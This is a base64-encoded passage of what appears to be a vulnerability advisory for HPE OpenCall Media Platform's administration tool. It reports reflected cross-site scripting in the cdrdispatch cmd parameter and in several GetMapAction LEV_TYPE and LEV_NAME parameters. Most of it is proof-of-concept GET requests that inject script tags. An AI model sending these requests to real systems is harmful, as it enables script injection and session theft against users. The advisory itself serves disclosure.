N0eWxlPSJ3aWR0aDogMTkzcHg7Ig0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZD0idHh0VXNlcm5hbWUiIHZhbHVlPSIiPjwvdGQ+DQogICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgICA8dHI+PHRkIGNvbHNwYW49IjIiIGhlaWdodD0iMyI+PC90ZD48L3RyPg0KICAgICAgICAgICAgICAgIDx0cj4NCiAgICAgICAgICAgICAgICAgICAgPHRkIHN0eWxlPSJmb250LWZhbWlseTogQXJpYWwsIEhlbHZldGljYSwNCnNhbnMtc2VyaWY7IGZvbnQtd2VpZ2h0OiBib2xkIj5QYXNzd29yZCZuYnNwOzwvdGQ+DQogICAgICAgICAgICAgICAgICAgIDx0ZD48aW5wdXQgbmFtZT0ial9wYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiDQpzaXplPSIxNCIgc3R5bGU9IndpZHRoOiAxOTFweCI+PC90ZD4NCiAgICAgICAgICAgICAgICA8L3RyPg0KICAgICAgICAgICAgICAgIDx0cj48dGQgY29sc3Bhbj0iMiIgaGVpZ2h0PSIzIj48L3RkPjwvdHI+DQo8dHI+PHRkIGNvbHNwYW49IjIiPiZuYnNwOzwvdGQ+PC90cj4NCiAgICAgICAgICAgICAgICAgICAgPHRkIGNvbHNwYW49IjIiIGFsaWduPSJyaWdodCI+DQogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9InN1Ym1pdCIgIHZhbHVlPSJMb2cgaW4iDQpzdHlsZT0id2lkdGg6NTRweDsgbWFyZ2luLXRvcDo4cHgiPkxvZ2luPC9idXR0b24+DQogICAgICAgICAgICAgICAgICAgIDwvdGQ+DQogICAgICAgICAgICAgICAgPC90cj4NCiAgICAgICAgICAgICAgICA8L3RhYmxlPg0KICAgICAgICAgICAgPC90ZD4NCiAgICAgICAgICAgIDx0ZCBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjogI0ZGRkZGRiI+Jm5ic3A7PC90ZD4NCiAgICAgICAgPC90cj4NCiAgICAgICAgPC90YWJsZT4NCiAgICA8L3RkPg0KPC90cj4NCjwvdGFibGU+DQo8L2Zvcm0+DQo8L2JvZHk+DQo8L2h0bWw+DQoNClBsYXRmb3JtIEFkbWluaXN0cmF0aW9uIFRvb2wg4oCTIFJlZmxlY3RlZCBDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKQ0KdGhhdCBsZWFkIHRvIFJlbW90ZSBDb2RlIEV4ZWN1dGlvbg0KSFBFIE9wZW5DYWxsIE1lZGlhIFBsYXRmb3JtIChPQ01QKSBkb2VzIG5vdCBzYW5pdGl6ZSBjZHJkaXNwYXRjaA0KZnVuY3Rpb24gd2l0aCBwYXJhbWV0ZXIgY21kPURpc3BsYXlCYXNlQ2RyQnJvd3NlUGFnZS4gQW4gYXR0YWNrZXIgY2FuDQppbmplY3QgbWFsaWNpb3VzIEphdmEgc2NyaXB0IHRvIHRyaWdnZXIgdGhlIENyb3NzLVNpdGUgU2NyaXB0aW5nDQooWFNTKS4NCg0KUHJvb2Ygb2YgQ29uY2VwdA0KQW4gQXR0YWNrZXIgc2VuZCB0aGUgZm9sbG93aW5nIEdFVCByZXF1ZXN0IHRvIHRoZSB2aWN0aW1zIG1hY2hpbmU6DQoNCkdFVCAvT0NNUE9BTS9jZHJkaXNwYXRjaD9jbWQ9RGlzcGxheUJhc2VDZHJCcm93c2VQYWdlZjVkZjM8c2NyaXB0PmFsZXJ0KDEpPCUyZnNjcmlwdD4xZDhiNCZzZXNzaW9uVHlwZT1OT05FDQpIVFRQLzEuMQ0KSG9zdDogMTcyLjI3LjExNi40MDo0NDQzDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBydjo0MC4wKQ0KR2Vja28vMjAxMDAxMDEgRmlyZWZveC80MC4wDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpETlQ6IDENClJlZmVyZXI6IGh0dHBzOi8vMTcyLjI3LjExNi40MDo0NDQzL09DTVBPQU0vQk1QRk1vbml0b3JNZ3IuY2hhaWxldA0KQ29va2llOiBKU0VTU0lPTklEPTRGOTlDMjc1MjVCRkRCNDRENDZFM0ExMDlGQTQ5REFDDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNClBsYXRmb3JtIEFkbWluaXN0cmF0aW9uIFRvb2wg4oCTIExFVl9UWVBFMCBwYXJhbWV0ZXINCg0KSFBFIE9wZW5DYWxsIE1lZGlhIFBsYXRmb3JtIChPQ01QKSBkb2VzIG5vdCBzYW5pdGl6ZSBHZXRNYXBBY3Rpb24NCmZ1bmN0aW9uIHBhcmFtZXRlciBMRVZfVFlQRTAgaW5wdXQuIEFuIGF0dGFja2VyIGNhbiBpbmplY3QgbWFsaWNpb3VzDQpKYXZhIHNjcmlwdCB0byB0cmlnZ2VyIHRoZSBSZWZsZWN0ZWQgQ3Jvc3MtU2l0ZSBTY3JpcHRpbmcgKFhTUykuDQoNClRoZSB2dWxuZXJhYmxlIFVSTDoNCi9PQ01QT0FNL0JNUEZGYXVsdE1nci5jaGFpbGV0P0dldE1hcEFjdGlvbj1IVE1MJkxFVkVMPVRPUF9MRVZFTCZUWVBFPTEmTkFNRT1Sb290JkRBVEU9MCZMRVZfTlVNPTAmTEVWX05BTUUwPU4wJkxFVl9OQU1FMT1OMSZMRVZfTkFNRTI9TjImTEVWX05BTUUzPU4zJkxFVl9UWVBFMD1UMDIxOTg14oCzPjxzY3JpcHQ+YWxlcnQoMSk8DQolMmZzY3JpcHQ+MGNhMzAmTEVWX1RZUEUxPVQxJkxFVl9UWVBFMj1UMiZMRVZfVFlQRTM9VDMNCg0KUHJvb2Ygb2YgQ29uY2VwdA0KDQpBbiBBdHRhY2tlciBzZW5kIHRoZSBmb2xsb3dpbmcgR0VUIHJlcXVlc3QgdG8gdGhlIHZpY3RpbXMgbWFjaGluZSA6DQoNCg0KR0VUIC9PQ01QT0FNL0JNUEZGYXVsdE1nci5jaGFpbGV0P0dldE1hcEFjdGlvbj1IVE1MJkxFVkVMPVRPUF9MRVZFTCZUWVBFPTEmTkFNRT1Sb290JkRBVEU9MCZMRVZfTlVNPTAmTEVWX05BTUUwPU4wJkxFVl9OQU1FMT1OMSZMRVZfTkFNRTI9TjImTEVWX05BTUUzPU4zJkxFVl9UWVBFMD1UMDIxOTg1Ij48c2NyaXB0PmFsZXJ0KDEpPCUyZnNjcmlwdD4wY2EzMCZMRVZfVFlQRTE9VDEmTEVWX1RZUEUyPVQyJkxFVl9UWVBFMz1UMw0KSFRUUC8xLjENCkhvc3Q6IDE3Mi4yNy4xMTYuNDA6NDQ0Mw0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgcnY6NDAuMCkNCkdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNDAuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KRE5UOiAxDQpSZWZlcmVyOiBodHRwczovLzE3Mi4yNy4xMTYuNDA6NDQ0My9PQ01QT0FNL0JNUEZGYXVsdE1nci5jaGFpbGV0DQpDb29raWU6IEpTRVNTSU9OSUQ9NEY5OUMyNzUyNUJGREI0NEQ0NkUzQTEwOUZBNDlEQUMNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0KUGxhdGZvcm0gQWRtaW5pc3RyYXRpb24gVG9vbCDigJMgTEVWX1RZUEUxIHBhcmFtZXRlcg0KDQpIUEUgT3BlbkNhbGwgTWVkaWEgUGxhdGZvcm0gKE9DTVApIGRvZXMgbm90IHNhbml0aXplIEdldE1hcEFjdGlvbg0KZnVuY3Rpb24gcGFyYW1ldGVyIExFVl9UWVBFMSBpbnB1dC4gQW4gYXR0YWNrZXIgY2FuIGluamVjdCBtYWxpY2lvdXMNCkphdmEgc2NyaXB0IHRvIHRyaWdnZXIgdGhlIFJlZmxlY3RlZCBDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKS4NCg0KVGhlIHZ1bG5lcmFibGUgVVJMOg0KL09DTVBPQU0vQk1QRkZhdWx0TWdyLmNoYWlsZXQ/R2V0TWFwQWN0aW9uPUhUTUwmTEVWRUw9VE9QX0xFVkVMJlRZUEU9MSZOQU1FPVJvb3QmREFURT0wJkxFVl9OVU09MCZMRVZfTkFNRTA9TjAmTEVWX05BTUUxPU4xJkxFVl9OQU1FMj1OMiZMRVZfTkFNRTM9TjMmTEVWX1RZUEUwPVQwJkxFVl9UWVBFMT1UMTQ1Mjdh4oCdPjxzY3JpcHQ+YWxlcnQoMSk8DQolMmZzY3JpcHQ+MmQ4NDgmTEVWX1RZUEUyPVQyJkxFVl9UWVBFMz1UMw0KDQpQcm9vZiBvZiBDb25jZXB0DQoNCkFuIEF0dGFja2VyIHNlbmQgdGhlIGZvbGxvd2luZyBHRVQgcmVxdWVzdCB0byB0aGUgdmljdGltcyBtYWNoaW5lIDoNCg0KDQpHRVQgL09DTVBPQU0vQk1QRkZhdWx0TWdyLmNoYWlsZXQ/R2V0TWFwQWN0aW9uPUhUTUwmTEVWRUw9VE9QX0xFVkVMJlRZUEU9MSZOQU1FPVJvb3QmREFURT0wJkxFVl9OVU09MCZMRVZfTkFNRTA9TjAmTEVWX05BTUUxPU4xJkxFVl9OQU1FMj1OMiZMRVZfTkFNRTM9TjMmTEVWX1RZUEUwPVQwJkxFVl9UWVBFMT1UMTQ1MjdhIj48c2NyaXB0PmFsZXJ0KDEpPCUyZnNjcmlwdD4yZDg0OCZMRVZfVFlQRTI9VDImTEVWX1RZUEUzPVQzDQpIVFRQLzEuMQ0KSG9zdDogMTcyLjI3LjExNi40MDo0NDQzDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBydjo0MC4wKQ0KR2Vja28vMjAxMDAxMDEgRmlyZWZveC80MC4wDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpETlQ6IDENClJlZmVyZXI6IGh0dHBzOi8vMTcyLjI3LjExNi40MDo0NDQzL09DTVBPQU0vQk1QRkZhdWx0TWdyLmNoYWlsZXQNCkNvb2tpZTogSlNFU1NJT05JRD00Rjk5QzI3NTI1QkZEQjQ0RDQ2RTNBMTA5RkE0OURBQw0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQpQbGF0Zm9ybSBBZG1pbmlzdHJhdGlvbiBUb29sIOKAkyBMRVZfVFlQRTIgcGFyYW1ldGVyDQpIUEUgT3BlbkNhbGwgTWVkaWEgUGxhdGZvcm0gKE9DTVApIGRvZXMgbm90IHNhbml0aXplIEdldE1hcEFjdGlvbg0KZnVuY3Rpb24gcGFyYW1ldGVyIExFVl9UWVBFMiBpbnB1dC4gQW4gYXR0YWNrZXIgY2FuIGluamVjdCBtYWxpY2lvdXMNCkphdmEgc2NyaXB0IHRvIHRyaWdnZXIgdGhlIFJlZmxlY3RlZCBDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKS4NCg0KVGhlIHZ1bG5lcmFibGUgVVJMOg0KL09DTVBPQU0vQk1QRkZhdWx0TWdyLmNoYWlsZXQ/R2V0TWFwQWN0aW9uPUhUTUwmTEVWRUw9VE9QX0xFVkVMJlRZUEU9MSZOQU1FPVJvb3QmREFURT0wJkxFVl9OVU09MCZMRVZfTkFNRTA9TjAmTEVWX05BTUUxPU4xJkxFVl9OQU1FMj1OMiZMRVZfTkFNRTM9TjMmTEVWX1RZUEUwPVQwJkxFVl9UWVBFMT1UMSZMRVZfVFlQRTI9VDI1MjJiMuKAsz48c2NyaXB0PmFsZXJ0KDEpPA0KJTJmc2NyaXB0PjU0ZjQ1JkxFVl9UWVBFMz1UMw0KDQpQcm9vZiBvZiBDb25jZXB0DQpBbiBBdHRhY2tlciBzZW5kIHRoZSBmb2xsb3dpbmcgR0VUIHJlcXVlc3QgdG8gdGhlIHZpY3RpbXMgbWFjaGluZSA6DQoNCg0KR0VUIC9PQ01QT0FNL0JNUEZGYXVsdE1nci5jaGFpbGV0P0dldE1hcEFjdGlvbj1IVE1MJkxFVkVMPVRPUF9MRVZFTCZUWVBFPTEmTkFNRT1Sb290JkRBVEU9MCZMRVZfTlVNPTAmTEVWX05BTUUwPU4wJkxFVl9OQU1FMT1OMSZMRVZfTkFNRTI9TjImTEVWX05BTUUzPU4zJkxFVl9UWVBFMD1UMCZMRVZfVFlQRTE9VDEmTEVWX1RZUEUyPVQyNTIyYjIiPjxzY3JpcHQ+YWxlcnQoMSk8JTJmc2NyaXB0PjU0ZjQ1JkxFVl9UWVBFMz1UMw0KSFRUUC8xLjENCkhvc3Q6IDE3Mi4yNy4xMTYuNDA6NDQ0Mw0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgcnY6NDAuMCkNCkdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNDAuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KRE5UOiAxDQpSZWZlcmVyOiBodHRwczovLzE3Mi4yNy4xMTYuNDA6NDQ0My9PQ01QT0FNL0JNUEZGYXVsdE1nci5jaGFpbGV0DQpDb29raWU6IEpTRVNTSU9OSUQ9NEY5OUMyNzUyNUJGREI0NEQ0NkUzQTEwOUZBNDlEQUMNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0KUGxhdGZvcm0gQWRtaW5pc3RyYXRpb24gVG9vbCDigJMgTEVWX1RZUEUzIHBhcmFtZXRlcg0KSFBFIE9wZW5DYWxsIE1lZGlhIFBsYXRmb3JtIChPQ01QKSBkb2VzIG5vdCBzYW5pdGl6ZSBHZXRNYXBBY3Rpb24NCmZ1bmN0aW9uIHBhcmFtZXRlciBMRVZfVFlQRTMgaW5wdXQuIEFuIGF0dGFja2VyIGNhbiBpbmplY3QgbWFsaWNpb3VzDQpKYXZhIHNjcmlwdCB0byB0cmlnZ2VyIHRoZSBSZWZsZWN0ZWQgQ3Jvc3MtU2l0ZSBTY3JpcHRpbmcgKFhTUykuDQoNClRoZSB2dWxuZXJhYmxlIFVSTDoNCi9PQ01QT0FNL0JNUEZGYXVsdE1nci5jaGFpbGV0P0dldE1hcEFjdGlvbj1IVE1MJkxFVkVMPVRPUF9MRVZFTCZUWVBFPTEmTkFNRT1Sb290JkRBVEU9MCZMRVZfTlVNPTAmTEVWX05BTUUwPU4wJkxFVl9OQU1FMT1OMSZMRVZfTkFNRTI9TjImTEVWX05BTUUzPU4zJkxFVl9UWVBFMD1UMCZMRVZfVFlQRTE9VDEmTEVWX1RZUEUyPVQyJkxFVl9UWVBFMz1UM2VjYzMy4oCzPjxzY3JpcHQ+YWxlcnQoMSk8DQolMmZzY3JpcHQ+NTRhMGYNCg0KUHJvb2Ygb2YgQ29uY2VwdA0KDQpBbiBBdHRhY2tlciBzZW5kIHRoZSBmb2xsb3dpbmcgR0VUIHJlcXVlc3QgdG8gdGhlIHZpY3RpbXMgbWFjaGluZSA6DQoNCkdFVCAvT0NNUE9BTS9CTVBGRmF1bHRNZ3IuY2hhaWxldD9HZXRNYXBBY3Rpb249SFRNTCZMRVZFTD1UT1BfTEVWRUwmVFlQRT0xJk5BTUU9Um9vdCZEQVRFPTAmTEVWX05VTT0wJkxFVl9OQU1FMD1OMCZMRVZfTkFNRTE9TjEmTEVWX05BTUUyPU4yJkxFVl9OQU1FMz1OMyZMRVZfVFlQRTA9VDAmTEVWX1RZUEUxPVQxJkxFVl9UWVBFMj1UMiZMRVZfVFlQRTM9VDNlY2MzMiI+PHNjcmlwdD5hbGVydCgxKTwlMmZzY3JpcHQ+NTRhMGYNCkhUVFAvMS4xDQpIb3N0OiAxNzIuMjcuMTE2LjQwOjQ0NDMNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IHJ2OjQwLjApDQpHZWNrby8yMDEwMDEwMSBGaXJlZm94LzQwLjANCkFjY2VwdDogdGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksKi8qO3E9MC44DQpBY2NlcHQtTGFuZ3VhZ2U6IGVuLVVTLGVuO3E9MC41DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkROVDogMQ0KUmVmZXJlcjogaHR0cHM6Ly8xNzIuMjcuMTE2LjQwOjQ0NDMvT0NNUE9BTS9CTVBGRmF1bHRNZ3IuY2hhaWxldA0KQ29va2llOiBKU0VTU0lPTklEPTRGOTlDMjc1MjVCRkRCNDRENDZFM0ExMDlGQTQ5REFDDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNClBsYXRmb3JtIEFkbWluaXN0cmF0aW9uIFRvb2wg4oCTIExFVl9OQU1FMCBwYXJhbWV0ZXINCg0KSFBFIE9wZW5DYWxsIE1lZGlhIFBsYXRmb3JtIChPQ01QKSBkb2VzIG5vdCBzYW5pdGl6ZSBHZXRNYXBBY3Rpb24NCmZ1bmN0aW9uIHBhcmFtZXRlciBMRVZfTkFNRTAgaW5wdXQuIEFuIGF0dGFja2VyIGNhbiBpbmplY3QgbWFsaWNpb3VzDQpKYXZhIHNjcmlwdCB0byB0cmlnZ2VyIHRoZSBSZWZsZWN0ZWQgQ3Jvc3MtU2l0ZSBTY3JpcHRpbmcgKFhTUykuDQoNClRoZSB2dWxuZXJhYmxlIFVSTDoNCi9PQ01QT0FNL0JNUEZGYXVsdE1nci5jaGFpbGV0P0dldE1hcEFjdGlvbj1IVE1MJkxFVkVMPVRPUF9MRVZFTCZUWVBFPTEmTkFNRT1Sb290JkRBVEU9MCZMRVZfTlVNPTAmTEVWX05BTUUwPU4wZmE4MDLigLM+PHNjcmlwdD5hbGVydCgxKTwNCiUyZnNjcmlwdD42NzFhOCZMRVZfTkFNRTE9TjEmTEVWX05BTUUyPU4yJkxFVl9OQU1FMz1OMyZMRVZfVFlQRTA9VDAmTEVWX1RZUEUxPVQxJkxFVl9UWVBFMj1UMiZMRVZfVFlQRTM9VDMNCg0KUHJvb2Ygb2YgQ29uY2VwdA0KDQpBbiBBdHRhY2tlciBzZW5kIHRoZSBmb2xsb3dpbmcgR0VUIHJlcXVlc3QgdG8gdGhlIHZpY3RpbXMgbWFjaGluZSA6DQoNCg0KR0VUIC9PQ01QT0FNL0JNUEZGYXVsdE1nci5jaGFpbGV0P0dldE1hcEFjdGlvbj1IVE1MJkxFVkVMPVRPUF9MRVZFTCZUWVBFPTEmTkFNRT1Sb290JkRBVEU9MCZMRVZfTlVNPTAmTEVWX05BTUUwPU4wZmE4MDIiPjxzY3JpcHQ+YWxlcnQoMSk8JTJmc2NyaXB0PjY3MWE4JkxFVl9OQU1FMT1OMSZMRVZfTkFNRTI9TjImTEVWX05BTUUzPU4zJkxFVl9UWVBFMD1UMCZMRVZfVFlQRTE9VDEmTEVWX1RZUEUyPVQyJkxFVl9UWVBFMz1UMw0KSFRUUC8xLjENCkhvc3Q6IDE3Mi4yNy4xMTYuNDA6NDQ0Mw0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgcnY6NDAuMCkNCkdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNDAuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KRE5UOiAxDQpSZWZlcmVyOiBodHRwczovLzE3Mi4yNy4xMTYuNDA6NDQ0My9PQ01QT0FNL0JNUEZGYXVsdE1nci5jaGFpbGV0DQpDb29raWU6IEpTRVNTSU9OSUQ9NEY5OUMyNzUyNUJGREI0NEQ0NkUzQTEwOUZBNDlEQUMNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0KUGxhdGZvcm0gQWRtaW5pc3RyYXRpb24gVG9vbCDigJMgTEVWX05BTUUxIHBhcmFtZXRlcg0KDQpIUEUgT3BlbkNhbGwgTWVkaWEgUGxhdGZvcm0gKE9DTVApIGRvZXMgbm90IHNhbml0aXplIEdldE1hcEFjdGlvbg0KZnVuY3Rpb24gcGFyYW1ldGVyIExFVl9OQU1FMSBpbnB1dC4gQW4gYXR0YWNrZXIgY2FuIGluamVjdCBtYWxpY2lvdXMNCkphdmEgc2NyaXB0IHRvIHRyaWdnZXIgdGhlIFJlZmxlY3RlZCBDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKS4NCg0KVGhlIHZ1bG5lcmFibGUgVVJMOg0KL09DTVBPQU0vQk1QRkZhdWx0TWdyLmNoYWlsZXQ/R2V0TWFwQWN0aW9uPUhUTUwmTEVWRUw9VE9QX0xFVkVMJlRZUEU9MSZOQU1FPVJvb3QmREFURT0wJkxFVl9OVU09MCZMRVZfTkFNRTA9TjAmTEVWX05BTUUxPU4xZjUzMGXigJ0+PHNjcmlwdD5hbGVydCgxKTwNCiUyZnNjcmlwdD5kNjc3ZiZMRVZfTkFNRTI9TjImTEVWX05BTUUzPU4zJkxFVl9UWVBFMD1UMCZMRVZfVFlQRTE9VDEmTEVWX1RZUEUyPVQyJkxFVl9UWVBFMz1UMw0KDQpQcm9vZiBvZiBDb25jZXB0DQoNCkFuIEF0dGFja2VyIHNlbmQgdGhlIGZvbGxvd2luZyBHRVQgcmVxdWVzdCB0byB0aGUgdmljdGltcyBtYWNoaW5lIDoNCg0KR0VUIC9PQ01QT0FNL0JNUEZGYXVsdE1nci5jaGFpbGV0P0dldE1hcEFjdGlvbj1IVE1MJkxFVkVMPVRPUF9MRVZFTCZUWVBFPTEmTkFNRT1Sb290JkRBVEU9MCZMRVZfTlVNPTAmTEVWX05BTUUwPU4wJkxFVl9OQU1FMT1OMWY1MzBlIj48c2NyaXB0PmFsZXJ0KDEpPCUyZnNjcmlwdD5kNjc3ZiZMRVZfTkFNRTI9TjImTEVWX05BTUUzPU4zJkxFVl9UWVBFMD1UMCZMRVZfVFlQRTE9VDEmTEVWX1RZUEUyPVQyJkxFVl9UWVBFMz1UMw0KSFRUUC8xLjENCkhvc3Q6IDE3Mi4yNy4xMTYuNDA6NDQ0Mw0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgNi4xOyBXT1c2NDsgcnY6NDAuMCkNCkdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNDAuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KRE5UOiAxDQpSZWZlcmVyOiBodHRwczovLzE3Mi4yNy4xMTYuNDA6NDQ0My9PQ01QT0FNL0JNUEZGYXVsdE1nci5jaGFpbGV0DQpDb29raWU6IEpTRVNTSU9OSUQ9NEY5OUMyNzUyNUJGREI0NEQ0NkUzQTEwOUZBNDlEQUMNCkNvbm5lY3Rpb246IGtlZXAtYWxpdmUNCg0KUGxhdGZvcm0gQWRtaW5pc3RyYXRpb24gVG9vbCDigJMgTEVWX05BTUUyIHBhcmFtZXRlcg0KDQpIUEUgT3BlbkNhbGwgTWVkaWEgUGxhdGZvcm0gKE9DTVApIGRvZXMgbm90IHNhbml0aXplIEdldE1hcEFjdGlvbg0KZnVuY3Rpb24gcGFyYW1ldGVyIExFVl9OQU1FMiBpbnB1dC4gQW4gYXR0YWNrZXIgY2FuIGluamVjdCBtYWxpY2lvdXMNCkphdmEgc2NyaXB0IHRvIHRyaWdnZXIgdGhlIFJlZmxlY3RlZCBDcm9zcy1TaXRlIFNjcmlwdGluZyAoWFNTKS4NCg0KVGhlIHZ1bG5lcmFibGUgVVJMOg0KL09DTVBPQU0vQk1QRkZhdWx0TWdyLmNoYWlsZXQ/R2V0TWFwQWN0aW9uPUhUTUwmTEVWRUw9VE9QX0xFVkVMJlRZUEU9MSZOQU1FPVJvb3QmREFURT0wJkxFVl9OVU09MCZMRVZfTkFNRTA9TjAmTEVWX05BTUUxPU4xJkxFVl9OQU1FMj1OMjYxYTlm4oCdPjxzY3JpcHQ+YWxlcnQoMSk8DQolMmZzY3JpcHQ+MTE4ZjMmTEVWX05BTUUzPU4zJkxFVl9UWVBFMD1UMCZMRVZfVFlQRTE9VDEmTEVWX1RZUEUyPVQyJkxFVl9UWVBFMz1UMw0KDQpQcm9vZiBvZiBDb25jZXB0DQoNCkFuIEF0dGFja2VyIHNlbmQgdGhlIGZvbGxvd2luZyBHRVQgcmVxdWVzdCB0byB0aGUgdmljdGltcyBtYWNoaW5lOg0KDQpHRVQgL09DTVBPQU0vQk1QRkZhdWx0TWdyLmNoYWlsZXQ/R2V0TWFwQWN0aW9uPUhUTUwmTEVWRUw9VE9QX0xFVkVMJlRZUEU9MSZOQU1FPVJvb3QmREFURT0wJkxFVl9OVU09MCZMRVZfTkFNRTA9TjAmTEVWX05BTUUxPU4xJkxFVl9OQU1FMj1OMjYxYTlmIj48c2NyaXB0PmFsZXJ0KDEpPCUyZnNjcmlwdD4xMThmMyZMRVZfTkFNRTM9TjMmTEVWX1RZUEUwPVQwJkxFVl9UWVBFMT1UMSZMRVZfVFlQRTI9VDImTEVWX1RZUEUzPVQzDQpIVFRQLzEuMQ0KSG9zdDogMTcyLjI3LjExNi40MDo0NDQzDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBydjo0MC4wKQ0KR2Vja28vMjAxMDAxMDEgRmlyZWZveC80MC4wDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpETlQ6IDENClJlZmVyZXI6IGh0dHBzOi8vMTcyLjI3LjExNi40MDo0NDQzL09DTVBPQU0vQk1QRkZhdWx0TWdyLmNoYWlsZXQNCkNvb2tpZTogSlNFU1NJT05JRD00Rjk5QzI3NTI1QkZEQjQ0RDQ2RTNBMTA5RkE0OURBQw0KQ29ubmVjdGlvbjoga2VlcC1hbGl2ZQ0KDQpQbGF0Zm9ybSBBZG1pbmlzdHJhdGlvbiBUb29sIOKAkyBMRVZfTkFNRTMgcGFyYW1ldGVyDQoNCkhQRSBPcGVuQ2FsbCBNZWRpYSBQbGF0Zm9ybSAoT0NNUCkgZG9lcyBub3Qgc2FuaXRpemUgR2V0TWFwQWN0aW9uDQpmdW5jdGlvbiBwYXJhbWV0ZXIgTEVWX05BTUUzIGlucHV0LiBBbiBhdHRhY2tlciBjYW4gaW5qZWN0IG1hbGljaW91cw0KSmF2YSBzY3JpcHQgdG8gdHJpZ2dlciB0aGUgUmVmbGVjdGVkIENyb3NzLVNpdGUgU2NyaXB0aW5nIChYU1MpLg0KDQpUaGUgdnVsbmVyYWJsZSBVUkw6DQovT0NNUE9BTS9CTVBGRmF1bHRNZ3IuY2hhaWxldD9HZXRNYXBBY3Rpb249SFRNTCZMRVZFTD1UT1BfTEVWRUwmVFlQRT0xJk5BTUU9Um9vdCZEQVRFPTAmTEVWX05VTT0wJkxFVl9OQU1FMD1OMCZMRVZfTkFNRTE9TjEmTEVWX05BTUUyPU4yJkxFVl9OQU1FMz1OMzBjNGI44oCzPjxzY3JpcHQ+YWxlcnQoMSk8DQolMmZzY3JpcHQ+YzEwYjImTEVWX1RZUEUwPVQwJkxFVl9UWVBFMT1UMSZMRVZfVFlQRTI9VDImTEVWX1RZUEUzPVQzDQoNClByb29mIG9mIENvbmNlcHQNCg0KQW4gQXR0YWNrZXIgc2VuZCB0aGUgZm9sbG93aW5nIEdFVCByZXF1ZXN0IHRvIHRoZSB2aWN0aW1zIG1hY2hpbmU6DQoNCkdFVCAvT0NNUE9BTS9CTVBGRmF1bHRNZ3IuY2hhaWxldD9HZXRNYXBBY3Rpb249SFRNTCZMRVZFTD1UT1BfTEVWRUwmVFlQRT0xJk5BTUU9Um9vdCZEQVRFPTAmT